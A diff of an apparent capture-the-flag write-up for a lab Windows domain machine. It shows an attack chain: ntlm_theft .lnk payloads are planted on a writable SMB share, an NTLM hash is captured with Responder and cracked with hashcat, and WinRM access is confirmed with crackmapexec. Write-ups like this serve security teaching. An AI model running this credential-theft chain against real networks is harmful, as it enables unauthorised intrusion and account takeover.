@@ -126,7 +126,7 @@ we have write permission to the smb server,
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dc3c8f28-22d9-4686-8eab-bccdd5fc58e7)
 
-after long research we got how to steal ntlm hash using responder with this ntlm_theft payload. [payload_gen](https://github.com/Greenwolf/ntlm_theft).
+after long research we got how to phish and steal ntlm hash using responder with this ntlm_theft payload. [payload_gen](https://github.com/Greenwolf/ntlm_theft).
 
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b0c83d9-912b-4342-9f76-e4f45ae42036)
 
@@ -163,6 +163,58 @@ Generation Complete.
 ```
 run the exploit to see how it works and generated some payloads we can use. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5ff14951-88e7-4859-9ca1-d69844953aef)
+
+payloads generated. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/09508a3f-f1b2-49f2-9b9b-760be16429bd)
+
+fire up responder
+
+```shell
+┌──(root㉿kali)-[~/ntlm_theft/testing]
+└─# smbclient \\\\HayStack.thm.corp\\Data -N
+Try "help" to get a list of possible commands.
+smb: \> cd onboarding\
+smb: \onboarding\> put testing.lnk 
+putting file testing.lnk as \onboarding\testing.lnk (45.0 kb/s) (average 45.0 kb/s)
+smb: \onboarding\> dir 
+  .                                   D        0  Sat Feb 10 18:04:15 2024
+  ..                                  D        0  Sat Feb 10 18:04:15 2024
+  101.nmap                            A     1260  Sat Feb 10 17:51:00 2024
+  44ocn1as.elc.txt                    A      521  Mon Aug 21 18:21:59 2023
+  4r2skt4b.sa2.pdf                    A  4700896  Mon Jul 17 08:11:53 2023
+  nfdpqxro.a0w.pdf                    A  3032659  Mon Jul 17 08:12:09 2023
+  testing.lnk                         A     2164  Sat Feb 10 18:04:15 2024
+
+                7863807 blocks of size 4096. 3023074 blocks available
+smb: \onboarding\> 
+```
+uploaded a testing.lnk file and check back responder
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5fabef38-7548-4345-b000-ea9373c00d9a)
+
+boom we got an NTLM hash for user `THM\AUTOMATE`. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a76da70b-55e7-4154-ad8d-eb94106722ef)
+
+using hashcat to crack the hash, we got the password. 
+
+## Initial foothold - winrm 
+
+```shell
+┌──(root㉿kali)-[~]
+└─# crackmapexec winrm 10.10.230.101 -u automate -p redacted
+SMB         10.10.230.101   5985   HAYSTACK         [*] Windows 10.0 Build 17763 (name:HAYSTACK) (domain:thm.corp)
+HTTP        10.10.230.101   5985   HAYSTACK         [*] http://10.10.230.101:5985/wsman
+WINRM       10.10.230.101   5985   HAYSTACK         [+] thm.corp\automate:redacted (Pwn3d!)
+```
+using crackmapexec to check for access, we can see that we can login winrm using the cred.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4a1bd524-0ca0-41c5-85a5-e62d35a6688f)
+
+now we login winrm using the creds
 
 
+## Privilege Escalation 
 
